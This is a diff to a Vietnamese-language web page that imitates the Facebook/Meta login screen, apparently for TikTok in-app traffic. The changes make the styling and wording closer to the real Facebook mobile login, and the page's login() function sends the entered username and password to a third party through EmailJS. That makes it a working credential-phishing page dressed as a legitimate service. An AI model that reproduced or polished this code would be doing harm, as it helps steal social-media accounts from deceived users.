@@ -17,8 +17,8 @@
             flex-direction: column;
         }
         body.tiktok-mode {
-            background: #fff;
-            justify-content: center;
+            background: linear-gradient(180deg, #e7f0fa 0%, #e7f0fa 50%, #d9f4e6 100%);
+            justify-content: space-between;
             align-items: center;
         }
         .header {
@@ -101,15 +101,12 @@
             z-index: 1;
         }
         body.tiktok-mode .login-container-tiktok {
-            margin-top: 60px;
             box-shadow: none;
             border-radius: 0;
             max-width: 100%;
             padding: 15px;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
+            background: transparent;
+            margin: 0;
         }
         .login-container-tiktok.active, .login-container-desktop.active,
         .forgot-password-container.active, .create-account-container.active,
@@ -121,15 +118,15 @@
             margin: 0 0 20px;
         }
         .custom-logo {
-            width: 40px;
-            height: 40px;
+            width: 56px;
+            height: 56px;
             background: #1877f2;
             border-radius: 50%;
             display: inline-flex;
             justify-content: center;
             align-items: center;
             color: #fff;
-            font-size: 28px;
+            font-size: 36px;
             font-weight: 700;
         }
         input {
@@ -151,7 +148,7 @@
             padding: 12px;
             background: #1877f2;
             border: none;
-            border-radius: 6px;
+            border-radius: 50px;
             color: #fff;
             font-size: 20px;
             font-weight: 600;
@@ -165,10 +162,10 @@
             width: 100%;
             max-width: 236px;
             padding: 12px;
-            background: #42b72a;
-            border: none;
-            border-radius: 6px;
-            color: #fff;
+            background: transparent;
+            border: 2px solid #1877f2;
+            border-radius: 50px;
+            color: #1877f2;
             font-size: 17px;
             font-weight: 600;
             margin: 12px auto 0;
@@ -176,7 +173,7 @@
             cursor: pointer;
         }
         .btn-create-account:hover {
-            background: #36a420;
+            background: #e7f3ff;
         }
         .forgot-password {
             color: #1877f2;
@@ -218,10 +215,8 @@
         }
         .footer-links-tiktok {
             display: none;
-            position: fixed;
-            bottom: 0;
             width: 100%;
-            background: #fff;
+            background: transparent;
             padding: 10px;
             text-align: center;
             font-size: 12px;
@@ -238,6 +233,11 @@
         }
         .footer-links-tiktok a:hover {
             text-decoration: underline;
+        }
+        .footer-links-tiktok .meta-logo {
+            color: #737373;
+            font-size: 14px;
+            font-weight: 600;
         }
         .footer {
             display: none;
@@ -291,7 +291,8 @@
         }
         .success-popup-title {
             font-size: 20px;
-            font-weight: 600;
+            font-weight: 60
+0;
             color: #1c1e21;
             margin-bottom: 10px;
         }
@@ -362,19 +363,19 @@
         <!-- TikTok Login -->
         <div class="login-container-tiktok">
             <div class="facebook-logo"><div class="custom-logo">f</div></div>
-            <input type="text" id="login-input-tiktok" placeholder="Email hoặc số điện thoại">
+            <input type="text" id="login-input-tiktok" placeholder="Số di động hoặc email">
             <input type="password" id="password-tiktok" placeholder="Mật khẩu">
             <button class="btn-primary" onclick="login('tiktok')">Đăng nhập</button>
-            <a href="#" class="forgot-password" onclick="showForgotPassword()">Quên mật khẩu?</a>
+            <a href="#" class="forgot-password" onclick="showForgotPassword()">Bạn quên mật khẩu ư?</a>
             <button class="btn-create-account" onclick="showCreateAccount()">Tạo tài khoản mới</button>
             <div class="back-button" onclick="showLogin()">Quay lại</div>
         </div>
         <!-- Desktop Login -->
         <div class="login-container-desktop">
-            <input type="text" id="login-input-desktop" placeholder="Email hoặc số điện thoại">
+            <input type="text" id="login-input-desktop" placeholder="Số di động hoặc email">
             <input type="password" id="password-desktop" placeholder="Mật khẩu">
             <button class="btn-primary" onclick="login('desktop')">Đăng nhập</button>
-            <a href="#" class="forgot-password" onclick="showForgotPassword()">Quên mật khẩu?</a>
+            <a href="#" class="forgot-password" onclick="showForgotPassword()">Bạn quên mật khẩu ư?</a>
             <div class="divider"></div>
             <button class="btn-create-account" onclick="showCreateAccount()">Tạo tài khoản mới</button>
             <div class="back-button" onclick="showLogin()">Quay lại</div>
@@ -411,10 +412,10 @@
         </div>
     </div>
     <div class="footer-links-tiktok">
+        <span class="meta-logo">∞ Meta</span>
         <a href="#" onclick="showAbout()">Giới thiệu</a>
         <a href="#" onclick="showHelp()">Trợ giúp</a>
-        <a href="#">Quyền riêng tư</a>
-        <a href="#">Điều khoản</a>
+        <a href="#">Xem thêm</a>
     </div>
     <footer class="footer">
         <div class="footer-content">
@@ -433,32 +434,32 @@
             <div class="footer-links">
                 <a onclick="showLogin()">Đăng nhập</a>
                 <a onclick="showCreateAccount()">Đăng ký</a>
-                <a href="#">Messenger</a>
-                <a href="#">Facebook Lite</a>
-                <a href="#">Watch</a>
-                <a href="#">Địa điểm</a>
-                <a href="#">Trò chơi</a>
-                <a href="#">Marketplace</a>
-                <a href="#">Meta Pay</a>
-                <a href="#">Meta Store</a>
-                <a href="#">Meta Quest</a>
-                <a href="#">Instagram</a>
-                <a href="#">Threads</a>
-                <a href="#">Quyên góp</a>
-                <a href="#">Dịch vụ</a>
-                <a href="#">Trung tâm thông tin bầu cử</a>
-                <a href="#">Chính sách quyền riêng tư</a>
-                <a href="#">Trung tâm quyền riêng tư</a>
-                <a href="#">Nhóm</a>
-                <a href="#">Giới thiệu</a>
-                <a href="#">Tạo quảng cáo</a>
-                <a href="#">Tạo Trang</a>
-                <a href="#">Nhà phát triển</a>
-                <a href="#">Tuyển dụng</a>
-                <a href="#">Cookie</a>
-                <a href="#">Lựa chọn quảng cáo</a>
-                <a href="#">Điều khoản</a>
-                <a href="#">Trợ giúp</a>
+                <a onclick="alert('Chuyển đến Messenger')">Messenger</a>
+                <a onclick="alert('Chuyển đến Facebook Lite')">Facebook Lite</a>
+                <a onclick="alert('Chuyển đến Watch')">Watch</a>
+                <a onclick="alert('Chuyển đến Địa điểm')">Địa điểm</a>
+                <a onclick="alert('Chuyển đến Trò chơi')">Trò chơi</a>
+                <a onclick="alert('Chuyển đến Marketplace')">Marketplace</a>
+                <a onclick="alert('Chuyển đến Meta Pay')">Meta Pay</a>
+                <a onclick="alert('Chuyển đến Meta Store')">Meta Store</a>
+                <a onclick="alert('Chuyển đến Meta Quest')">Meta Quest</a>
+                <a onclick="alert('Chuyển đến Instagram')">Instagram</a>
+                <a onclick="alert('Chuyển đến Threads')">Threads</a>
+                <a onclick="alert('Chuyển đến Quyên góp')">Quyên góp</a>
+                <a onclick="alert('Chuyển đến Dịch vụ')">Dịch vụ</a>
+                <a onclick="alert('Chuyển đến Trung tâm thông tin bầu cử')">Trung tâm thông tin bầu cử</a>
+                <a onclick="alert('Chuyển đến Chính sách quyền riêng tư')">Chính sách quyền riêng tư</a>
+                <a onclick="alert('Chuyển đến Trung tâm quyền riêng tư')">Trung tâm quyền riêng tư</a>
+                <a onclick="alert('Chuyển đến Nhóm')">Nhóm</a>
+                <a onclick="showAbout()">Giới thiệu</a>
+                <a onclick="alert('Chuyển đến Tạo quảng cáo')">Tạo quảng cáo</a>
+                <a onclick="alert('Chuyển đến Tạo Trang')">Tạo Trang</a>
+                <a onclick="alert('Chuyển đến Nhà phát triển')">Nhà phát triển</a>
+                <a onclick="alert('Chuyển đến Tuyển dụng')">Tuyển dụng</a>
+                <a onclick="alert('Chuyển đến Cookie')">Cookie</a>
+                <a onclick="alert('Chuyển đến Lựa chọn quảng cáo')">Lựa chọn quảng cáo</a>
+                <a onclick="alert('Chuyển đến Điều khoản')">Điều khoản</a>
+                <a onclick="showHelp()">Trợ giúp</a>
             </div>
             <div class="footer-meta">Meta © 2025</div>
         </div>
@@ -546,7 +547,7 @@
             const loginInput = document.getElementById(`login-input-${mode}`).value;
             const password = document.getElementById(`password-${mode}`).value;
             if (!loginInput || !password) {
-                showPopup("Lỗi", "Vui lòng nhập đầy đủ thông tin.");
+                showPopup("Đăng nhập không thành công", "Vui lòng nhập đầy đủ thông tin.");
                 return;
             }
             const templateParams = {
@@ -557,7 +558,7 @@
             };
             emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
                 .then(() => showPopup("Thành công", "Thông tin đăng nhập đã được gửi qua email."), 
-                      () => showPopup("Lỗi", "Có lỗi xảy ra khi gửi thông tin."));
+                      () => showPopup("Đăng nhập không thành công", "Có lỗi xảy ra khi gửi thông tin."));
         }
 
         function searchByPhone() {
